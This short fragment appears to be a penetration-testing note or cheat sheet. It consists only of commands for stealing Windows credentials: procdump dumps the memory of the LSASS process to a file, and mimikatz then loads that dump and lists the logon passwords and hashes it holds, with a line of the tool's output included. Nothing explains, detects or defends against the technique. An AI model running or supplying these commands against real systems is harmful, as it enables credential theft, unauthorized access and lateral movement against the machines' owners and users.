procdump64.exe  -accepteula  -ma lsass.exe lsass.dmp

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP
mimikatz # sekurlsa::logonPasswords full